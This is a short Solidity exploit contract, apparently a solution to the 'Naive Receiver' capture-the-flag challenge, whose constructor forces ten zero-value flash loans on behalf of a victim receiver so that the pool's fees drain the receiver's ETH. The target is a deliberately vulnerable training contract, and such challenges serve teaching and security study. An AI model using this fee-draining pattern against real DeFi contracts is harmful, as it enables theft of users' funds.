// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

import { NaiveReceiverLenderPool } from "src/02-NaiveReceiver/NaiveReceiverLenderPool.sol";

contract Attack {
    constructor(NaiveReceiverLenderPool pool, IERC3156FlashBorrower receiver) {
        for (uint256 i = 0; i < 10; ++i) {
            pool.flashLoan(receiver, pool.ETH(), 0, "");
        }
    }
}
